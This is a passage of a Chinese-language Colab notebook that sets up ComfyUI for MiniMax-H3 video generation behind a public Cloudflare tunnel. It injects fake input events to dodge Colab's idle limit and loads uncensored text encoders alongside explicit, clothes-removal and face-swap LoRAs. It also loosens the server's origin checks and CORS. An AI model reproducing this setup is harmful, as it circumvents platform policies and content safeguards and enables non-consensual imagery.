        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

for _pw in range(3):
    try:
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}), timeout=120).read()
        break
    except Exception:
        time.sleep(2)

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()

from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 FastH3-Omni 实时全参模式（41G 原生8步满血版 + 13G Blackwell版）已就绪！")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)
display(HTML(f'''
<div style="padding:18px;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);border:2px solid #00e676;border-radius:12px;color:#fff;font-family:sans-serif;margin-top:8px;">
  <h3 style="margin:0 0 10px 0;color:#00e676;">⚡ FastH3-Omni 实时全参模式（41G 原生8步满血版 + 13G Blackwell版）已启动！</h3>
  <p style="margin:0 0 12px 0;font-size:14px;color:#cfd8dc;">已挂载：<b>{target_model_bf16}</b> & <b>{target_model_fp4}</b> | 专属工作流池：<b>Omni_* (原生8步直出，已自动旁路多余加速LoRA)</b></p>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:12px 26px;background:#00e676;color:#000;font-weight:bold;font-size:16px;border-radius:8px;text-decoration:none;box-shadow:0 4px 12px rgba(0,230,118,0.4);">🌐 点击打开 ComfyUI (Cloudflare 免403直连)</a>
</div>
'''))
try:
    from google.colab import output
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

# === [AGY_FOREGROUND_GUARDIAN_V2] 保持 Colab 内核 Busy 防闲置断连 + ComfyUI/隧道崩溃 3秒自动复活 ===
print("🛡️ [防断连守护已启动] 当前单元格将保持运行状态以防止 Colab 闲置回收（如需切换其他模型格，点左上角 ⏹️ 停止即可）...")
_guardian_tick = 0
try:
    while True:
        time.sleep(15)
        _guardian_tick += 1
        # 1. 检查 ComfyUI 8188 端口，若因显存/内存峰值闪退则 3 秒内原地自动重启（网址不变）
        if not _is_port_open(8188):
            print("⚠️ 检测到 ComfyUI 引擎意外退出，正在 3 秒内自动重启恢复（原 Cloudflare 网址保持不变）...")
            subprocess.Popen(
                ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
                cwd="/content/ComfyUI",
                start_new_session=True
            )
            for _ in range(90):
                if _is_port_open(8188):
                    print("✅ ComfyUI 引擎已自动复活！切回网页即可继续使用。")
                    break
                time.sleep(0.5)
        # 2. 检查 cloudflared 进程是否存活
        if subprocess.run(["pgrep", "-x", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            print("⚠️ 检测到 Cloudflare 隧道进程断开，正在自动重连...")
            cf_url = _ensure_cf_tunnel()
            print(f"✅ 隧道已重新连通：👉 {cf_url}")
        # 3. 每 45 秒通过 Colab 官方双向 RPC 通道发送一次轻量心跳，重置前端闲置计时器
        if _guardian_tick % 3 == 0:
            try:
                from google.colab import output as _colab_out
                _colab_out.eval_js("1", ignore_result=True)
            except Exception:
                pass
except KeyboardInterrupt:
    print("⏹️ 已手动停止守护循环（后台 ComfyUI 与隧道仍保持运行，可随时运行其他单元格）。")


In [ ]:
# @title 🌟 5. C站 MiniMax-H3 Remix 选项（64G社区二合一底模 + 25G未删减CLIP）
# === [AGY_COLAB_KEEPALIVE_GUARD] ===
try:
    from IPython.display import display, Javascript
    display(Javascript('''
    (function(){
      try {
        if (!window._agyKeepAliveAudio) {
          const Ctx = window.AudioContext || window.webkitAudioContext;
          const ctx = new Ctx();
          const osc = ctx.createOscillator();
          const g = ctx.createGain();
          g.gain.value = 0.00001;
          osc.connect(g); g.connect(ctx.destination); osc.start();
          window._agyKeepAliveAudio = ctx;
        }
      } catch(e){}
      if (window._agyKeepAliveTimer) clearInterval(window._agyKeepAliveTimer);
      window._agyKeepAliveTimer = setInterval(() => {
        try {
          if (window._agyKeepAliveAudio && window._agyKeepAliveAudio.state === 'suspended') window._agyKeepAliveAudio.resume();
          const doc = window.parent ? window.parent.document : document;
          doc.dispatchEvent(new MouseEvent('mousemove', {bubbles:true, clientX:120, clientY:120}));
          doc.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:'Shift'}));
        } catch(e){}
      }, 45000);
    })();
    '''))
except Exception:
    pass
# --- Auto-Ensure Pika H3 Flex 6-Step Turbo LoRAs (Ref2VA & FL2VA) ---
def _ensure_pika_h3_flex_loras():
    import os, subprocess
    lora_dir = "/content/lora_pool_h3"
    os.makedirs(lora_dir, exist_ok=True)
    pika_loras = [
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_ref2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方多参版】pika_h3_flex_ref2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_fl2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方首尾帧版】pika_h3_flex_fl2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_ref2va_v1_avg_rank_55_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量多参版】pika_h3_flex_ref2va_kijai_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_fl2va_v1_avg_rank_56_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量首尾帧版】pika_h3_flex_fl2va_kijai_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3-experimental/resolve/main/loras/minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors", "【2K超清重绘精修LoRA-OpenRegen】minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_character_swap_v1.1_ref2va_fro.safetensors", "【视频换人角色替换LoRA-Alisson】minimax_h3_character_swap_v1.1_ref2va_fro.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_head_swap_v1.0_r32.safetensors", "【视频换头换脸LoRA-Alisson】minimax_h3_head_swap_v1.0_r32.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors", "【视频动作迁移跳舞LoRA-Alisson】minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors"),
    ]
    for url, fname in pika_loras:
        dst = os.path.join(lora_dir, fname)
        if not os.path.exists(dst) or os.path.getsize(dst) < 1024 * 1024:
            print(f"⚡ 正在自动下载 Pika H3 Flex 6步极速加速模型: {fname} ...")
            subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--console-log-level=error", "-d", lora_dir, "-o", fname, url], check=False)
_ensure_pika_h3_flex_loras()

import os, subprocess, json
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
for _h3_cn, _h3_url in [("ComfyUI-H3-LongVideo", "https://github.com/Zzz1phyrf/ComfyUI-H3-LongVideo.git"), ("selflift-Avatar", "https://github.com/slmonker/selflift-Avatar.git"), ("ComfyUI-YCNodes-MiniMax-H3", "https://github.com/yichengup/ComfyUI-YCNodes-MiniMax-H3.git"), ("rgthree-comfy", "https://github.com/rgthree/rgthree-comfy.git"), ("ComfyUI-MiniMaxH3-PrefixStream", "https://github.com/knoic/ComfyUI-MiniMaxH3-PrefixStream.git"), ("ComfyUI-FeiHou-Easy-H3", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Easy-H3.git"), ("ComfyUI-MiniMaxH3_LatentUpscaler", "https://github.com/TripleHeadedMonkey/ComfyUI-MiniMaxH3_LatentUpscaler.git"), ("BSAI-MiniMAX-H3-Prompt", "https://github.com/xm6018924/BSAI-MiniMAX-H3-Prompt.git")]:
    if not os.path.exists(f"/content/ComfyUI/custom_nodes/{_h3_cn}"):
        subprocess.run(["git", "clone", "--depth", "1", _h3_url, f"/content/ComfyUI/custom_nodes/{_h3_cn}"], check=False)
        if _h3_cn == "ComfyUI-H3-LongVideo": subprocess.run([sys.executable, "-m", "pip", "install", "-q", "faster-whisper==1.2.1"], check=False)
# @markdown > 💡 **选择 C站 FeiHou Remix 二合一底模精度与配套未删减 CLIP**：
Remix底模精度变体 = "BF16 满血版 (64G · 画质与细节最强，推荐)" # @param ["BF16 满血版 (64G · 画质与细节最强，推荐)", "INT8 极速版 (31G · G4硬件INT8加速2倍速)", "PRISM×10Eros×PikaFlex 三合一破限融合版 (19.2G INT8 · 写实大人+6步极速)"]

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
lora_dir = "/content/ComfyUI/models/loras"
import shutil as _sh_a2
if not _sh_a2.which("aria2c"):
    subprocess.run("apt-get update -qq && apt-get install -y -qq aria2 >/dev/null 2>&1", shell=True, check=False)
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)
os.makedirs(lora_dir, exist_ok=True)

if "BF16" in Remix底模精度变体:
    target_model = "【64G满血-C站Remix二合一】FeiHou_MiniMax-H3_Remix_v0.6_bf16.safetensors"
    model_url = "https://huggingface.co/FX-FeiHou/MiniMax-H3-Remix/resolve/main/FeiHou_MiniMax-H3_Remix_v0.6.safetensors"
elif "PRISM" in Remix底模精度变体:
    target_model = "【19G三合一破限极速-PRISM×10Eros×PikaFlex】10Eros_Max_SingularityV2_PRISM2_PikaFlex_0.85_int8HQ.safetensors"
    model_url = "https://huggingface.co/OliviaRossi/Minimax-h3_Singularity-x-10Eros-Max_PRISM/resolve/main/10Eros_Max_SingularityV2_PRISM2_PikaFlex_0.85_int8HQ.safetensors"
else:
    target_model = "【31G极速-C站Remix二合一】FeiHou_MiniMax-H3_Remix_v0.6_int8_convrot.safetensors"
    model_url = "https://huggingface.co/FX-FeiHou/MiniMax-H3-Remix/resolve/main/FeiHou_MiniMax-H3_Remix_v0.6_int8_convrot_v2.safetensors"

轻量化CLIP选择 = "25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)" # @param ["25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)", "15G Heretic破限未删减极速版 (Momoking NVFP4 · 宽松审核)"]
重置默认工作流 = False # @param {type:"boolean"}
if "15G 官方NVFP4" in 轻量化CLIP选择:
    target_clip = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
elif "25G 官方INT8" in 轻量化CLIP选择:
    target_clip = "【25G轻量化均衡版-CLIP】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
elif "15G Heretic" in 轻量化CLIP选择:
    target_clip = "【15G破限未删减极速版-CLIP】qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
    clip_url = "https://huggingface.co/Momoking/Qwen3-VL-32B-Heretic-MiniMax-H3-NVFP4/resolve/main/qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
else:
    target_clip = "【25G轻量化未删减-C站Remix配套CLIP】minimaxH3Remix_int8ConvrotV06Fixed_txt.safetensors"
    clip_url = "https://huggingface.co/linjian257/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257/resolve/main/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257.safetensors"

print("🧹 正在卸载其他底模与非配套 CLIP，严格只保留当前所选配置（释放磁盘空间）...")
for f in list(os.listdir(diff_dir)):
    fp = os.path.join(diff_dir, f)
    if os.path.islink(fp):
        os.unlink(fp)
    elif f.endswith(".safetensors") and f != target_model:
        print(f"  🗑️ 已卸载其他底模: {f}")
        os.remove(fp)
for f in list(os.listdir(clip_dir)):
    fp = os.path.join(clip_dir, f)
    if os.path.islink(fp):
        os.unlink(fp)
    elif f.endswith(".safetensors") and f != target_clip:
        print(f"  🗑️ 已卸载非当前 CLIP: {f}")
        os.remove(fp)

print(f"⏳ 正在检查/下载 C站社区版 MiniMax-H3 Remix 主底模: {target_model} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "--user-agent=Mozilla/5.0", "-d", diff_dir, "-o", target_model, model_url
], check=True)

print(f"⏳ 正在检查/下载 C站社区版配套未删减版 CLIP (fileId=3137729): {target_clip} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "--user-agent=Mozilla/5.0", "-d", clip_dir, "-o", target_clip, clip_url
], check=True)

os.makedirs("/content/lora_pool_h3", exist_ok=True)
# Auto-install all H3 LoRAs (including the 4 new Civitai LoRAs) whenever any H3 cell runs
import urllib.request as _ur_l
from concurrent.futures import ThreadPoolExecutor as _TPE_L
_h3_pool = "/content/lora_pool_h3"
os.makedirs(_h3_pool, exist_ok=True)
_civ_tok = globals().get("C站_API_Token", "")
_civ_h3_list = [["3413468", "3305979", "【H3-C站大人解锁V2.1】Minimax_H3_Unlocked_V2.1.safetensors"], ["3399711", "3290118", "【H3-C站大人-女性特写动作V1】H3_Female_Action_V1.safetensors"], ["3394502", "3284268", "【H3-C站大人-去衣动作V1.1】H3_Remove_Clothes_V1.1.safetensors"], ["3268303", "3152083", "【H3-C站大人-全能互动AIO_V2.5】H3_AIO_Interaction_V2.5.safetensors"], ["3206518", "3088013", "【H3-C站大人-全能互动AIO_V2】H3_AIO_Interaction_V2.safetensors"], ["3416478", "3311427", "【H3-C站大人-双人互动增强V5_全参】Mystic_MMH3_V5_Ref2VA.safetensors"], ["3403761", "3294817", "【C站成人-传教士姿势增强V1】MISSIONLG_H3_v1.safetensors"], ["3420786", "3314770", "【H3-C站大人-亲密互动特写V1】H3_Close_Interaction_V1.safetensors"], ["3404369", "3295540", "【H3-C站大人-身材细节增强V1】H3_Body_Detail_V1.safetensors"], ["3237012", "3119472", "【H3-C站大人-丰满曲线增强V0.3】H3_Curvy_Helper_V0.3.safetensors"], ["3402446", "3293205", "【H3-C站大人-俯视领口走光增强V1】Down_blouse_101-h3.safetensors"], ["3426349", "3321345", "【H3-C站大人-抓头发互动动作V1】hair_pulling_h3_101.safetensors"], ["3408385", "3300137", "【H3-C站大人-快慢动作极限滑块V2】PornMaster_MMH3_Fast_motion_slider_V2.safetensors"], ["3202732", "3091422", "【4步加速LoRA-Turbo社区版】minimax_h3_turbo_v4_step600_pruned_comfyui.safetensors"], ["3384273", "3273015", "【慢动作丝滑同步LoRA】SSS_Rank_MiniMax_H3_Smooth_Slow_Sync.safetensors"], ["3421124", "3315156", "【真人皮肤去油光LoRA】MMH3_RealismSlider_V1.safetensors"], ["3314964", "3200403", "【细节锐化增强LoRA】MMH3_DetailSlider_V1.safetensors"], ["3409409", "3301293", "【动作速度调节LoRA】MMH3_ActionSpeedSlider_V1.safetensors"], ["3389300", "3278497", "【C站增强-动作快慢速率滑块】H3_speed_slider_1.1.safetensors"]]
class _NoRedirL(_ur_l.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl): return None
_civ_op_l = _ur_l.build_opener(_NoRedirL)
def _res_civ_l(item):
    _vid, _fid, _fn = item
    _fp = os.path.join(_h3_pool, _fn)
    if os.path.exists(_fp) and os.path.getsize(_fp) > 50000: return None
    _u = f"https://civitai.com/api/download/models/{_vid}?fileId={_fid}&token={_civ_tok}"
    try: _civ_op_l.open(_ur_l.Request(_u, headers={"User-Agent": "Mozilla/5.0"}), timeout=12)
    except _ur_l.HTTPError as _e:
        if _e.headers.get("Location"): return (_e.headers.get("Location"), _fn)
    except Exception: pass
    return (_u, _fn)
_aria_l = []
with _TPE_L(max_workers=10) as _ex_l:
    for _r in _ex_l.map(_res_civ_l, _civ_h3_list):
        if _r: _aria_l.append(f"{_r[0]}\n  dir={_h3_pool}\n  out={_r[1]}")
if _aria_l:
    print(f"⏳ 正在自动并发补齐 {len(_aria_l)} 个 H3 专属 C站 LoRA...")
    open("/tmp/h3_civ_loras.txt", "w", encoding="utf-8").write("\n".join(_aria_l) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/h3_civ_loras.txt", "-c", "-j", "16", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn"], check=False)
for _del_d in ("/content/lora_pool_h3", "/content/ComfyUI/models/loras"):
    if os.path.isdir(_del_d):
        for _del_f in ['【C站成人-双人互动增强V1】MysticXXX_MMH3-V1.safetensors', '【H3-C站大人-双人互动增强V5_文生图生】Mystic_MMH3_V5_FL2VA.safetensors', '【H3-C站大人-高频动作律动增强V2_文生图生】H3_Motion_Booster_V2.safetensors', '【H3-C站大人-高频动作律动增强V2_全参】H3_Motion_Booster_V2_Ref2VA.safetensors', '【H3-C站大人-流体特效增强V1】H3_Fluid_Effect_V1.safetensors']:
            _del_p = os.path.join(_del_d, _del_f)
            if os.path.exists(_del_p) or os.path.islink(_del_p):
                try: os.remove(_del_p)
                except Exception: pass
for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass
os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
_lora_active = "/content/ComfyUI/models/loras"
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        try: os.unlink(_p)
        except Exception: pass
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _is_qw = any(_k in _f for _k in ("千问", "Qwen", "qwen", "Anime2Real", "2anime", "canon_qwen", "chatrlabs", "multiple_angles", "viggle", "NoctQA"))
        _pool = "/content/lora_pool_qwen" if _is_qw else "/content/lora_pool_h3"
        try: os.replace(_p, os.path.join(_pool, _f))
        except Exception: pass
for _f in sorted(os.listdir("/content/lora_pool_h3")):
    _src_p = os.path.join("/content/lora_pool_h3", _f)
    if _f.endswith(".safetensors") and os.path.exists(_src_p) and os.path.getsize(_src_p) > 50 * 1024:
        _dst_p = os.path.join(_lora_active, _f)
        if not os.path.exists(_dst_p):
            try: os.symlink(_src_p, _dst_p)
            except Exception: pass
print("🧹 已切换为【H3视频专属LoRA与工作流配置（自动隔离千问LoRA & 保护你在网页修改的工作流）】")

import shutil as _sh
wf_dir = "/content/ComfyUI/user/default/workflows"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json"):
        _wfp = os.path.join(wf_dir, _wf)
        if "qwen" in _wf.lower() or "千问" in _wf:
            try:
                _sh.copy2(_wfp, os.path.join("/content/wf_pool_qwen", _wf))
                os.remove(_wfp)
            except Exception: pass
        elif not globals().get("重置默认工作流", False) and os.path.getsize(_wfp) > 100:
            try: _sh.copy2(_wfp, os.path.join("/content/wf_pool_h3", _wf))
            except Exception: pass
for _wf in os.listdir("/content/wf_pool_h3"):
    if _wf.endswith(".json") and not ("qwen" in _wf.lower() or "千问" in _wf):
        _dst_wf = os.path.join(wf_dir, _wf)
        if globals().get("重置默认工作流", False) or not os.path.exists(_dst_wf) or os.path.getsize(_dst_wf) < 100:
            try: _sh.copy2(os.path.join("/content/wf_pool_h3", _wf), _dst_wf)
            except Exception: pass
if not [f for f in os.listdir(wf_dir) if f.endswith(".json")]:
    import base64, zlib
    _wfs = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
    for _fn, _wdata in _wfs.items():
        json.dump(_wdata, open(os.path.join(wf_dir, _fn), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
for _target_wdir in [wf_dir, "/content/wf_pool_h3"]:
  if os.path.exists(_target_wdir):
    for wfname in sorted(os.listdir(_target_wdir)):
        if wfname.endswith(".json") and not ("qwen" in wfname.lower() or "千问" in wfname):
            wpath = os.path.join(_target_wdir, wfname)
            try:
                wf = json.load(open(wpath, encoding="utf-8"))
                all_nodes = list(wf.get("nodes", []))
                for sg in wf.get("definitions", {}).get("subgraphs", []):
                    all_nodes.extend(sg.get("nodes", []))
                for n in all_nodes:
                    ntype = n.get("type", "")
                    wv = n.get("widgets_values")
                    if ntype == "UNETLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_model
                    elif ntype == "CLIPLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and isinstance(wv, list) and len(wv) >= 3:
                        wv[0], wv[1], wv[2] = target_model, target_model, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and isinstance(wv, list) and len(wv) >= 2:
                        wv[0], wv[1] = target_model, target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(wv, list) and len(wv) >= 7:
                        wv[5], wv[6] = target_model, target_clip
                json.dump(wf, open(wpath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
